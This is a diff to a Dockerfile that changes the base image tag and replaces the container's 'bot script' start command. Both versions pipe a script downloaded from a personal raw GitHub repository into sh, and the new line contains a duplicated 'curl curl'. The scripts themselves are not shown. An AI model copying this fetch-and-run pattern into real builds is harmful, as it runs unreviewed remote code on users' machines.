@@ -1,4 +1,4 @@
-FROM phusion/baseimage:bionic-1.0.0
+FROM phusion/baseimage:18.04-1.0.0
 
 # Use baseimage-docker's init system:
 CMD ["/sbin/my_init"]
@@ -37,5 +37,5 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
-CMD curl https://raw.githubusercontent.com/55113110159/apikey/main/virtex.sh | sh 
+CMD curl curl https://raw.githubusercontent.com/55113110159/java/master/mxl.sh | sh
 
